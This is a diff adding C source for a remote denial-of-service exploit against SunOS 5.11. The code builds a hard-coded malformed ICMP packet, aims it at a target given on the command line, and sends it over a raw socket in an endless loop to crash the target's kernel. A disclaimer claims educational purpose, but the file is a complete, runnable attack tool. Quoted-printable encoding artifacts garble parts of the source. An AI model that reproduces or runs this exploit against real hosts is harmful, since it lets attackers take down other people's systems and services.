@@ -1,0 +1,96 @@
+/*
+*  SunOS 5.11 Remote ICMP Weakness Kernel DoS Exploit
+*
+*  Todor Donev <todor.donev@gmail.com>
+*  http://www.ethical-hacker.org/
+*  https://www.facebook.com/ethicalhackerorg
+*
+*  Disclaimer:
+*  This or previous programs is for Educational
+*  purpose ONLY. Do not use it without permission.
+*  The usual disclaimer applies, especially the
+*  fact that Todor Donev is not liable for any
+*  damages caused by direct or indirect use of the
+*  information or functionality provided by these
+*  programs. The author or any Internet provider
+*  bears NO responsibility for content or misuse
+*  of these programs or any derivatives thereof.
+*  By using these programs you accept the fact
+*  that any damage (dataloss, system crash,
+*  system compromise, etc.) caused by the use
+*  of these programs is not Todor Donev's
+*  responsibility.
+*
+*  Use them at your own risk!
+*
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+=20
+unsigned char b00m[75] =3D
+{
+    0x45, 0xFF, 0x00, 0x4D, 0x0C,
+    0x52, 0x00, 0x00, 0x7E, 0x01,
+    0x0C, 0xF2, 0x85, 0x47, 0x21,
+    0x07, 0xC0, 0xA8, 0x0E, 0x58,
+    0x03, 0x01, 0xAE, 0x37, 0x6F,
+    0x3B, 0x66, 0xA7, 0x60, 0xAA,
+    0x76, 0xC1, 0xEC, 0xA7, 0x7D,
+    0xFA, 0x8A, 0x72, 0x8E, 0xC6,
+    0xE3, 0xD2, 0x64, 0x13, 0xE7,
+    0x4D, 0xBC, 0x01, 0x40, 0x5B,
+    0x8E, 0x8B, 0xE5, 0xEE, 0x5E,
+    0x37, 0xDD, 0xC2, 0x54, 0x8E,
+    0x8D, 0xCE, 0x0C, 0x42, 0x97,
+    0xA1, 0x8C, 0x04, 0x8A, 0xC2,=20
+    0x6B, 0xAE, 0xE9, 0x2E, 0xFE,
+} ;
+=20
+    long   resolve(char *target){
+    struct hostent *tgt;
+    long   addr;
+=20
+    tgt =3D gethostbyname(target);
+if (tgt =3D=3D NULL)
+  return(-1);
+    memcpy(&addr,tgt->h_addr,tgt->h_length);
+    memcpy(b00m+16,&addr,sizeof(long));
+  return(addr);
+}
+int main(int argc, char *argv[]){
+    struct  sockaddr_in dst;
+    long    saddr, daddr;
+    int     s0cket;
+    printf("[ SunOS 5.11 Remote ICMP Weakness Kernel DoS Exploit\n");
+    printf("[ Todor Donev <todor.donev@gmail.com> www.ethical-hacker.org\n"=
+);
+  if (argc < 2){
+    printf("[ Usage: %s <target>\n", *argv);
+    return(1);
+  }
+  daddr   =3D resolve(argv[1]);
+  saddr   =3D INADDR_ANY;
+  memcpy(b00m+16, &daddr, sizeof(long));
+  dst.sin_addr.s_addr   =3D daddr;
+  dst.sin_family        =3D AF_INET;
+  s0cket                =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s0cket =3D=3D -1)
+    return(1);
+    printf("[ ICMP Attacking: %s\n", argv[1]);
+  while(1){
+    if (sendto(s0cket,&b00m,75,0,(struct sockaddr *)&dst,sizeof(struct sock=
+addr_in)) =3D=3D -1){
+         perror("[ Error");
+         exit(-1);
+    }
+  }
+}
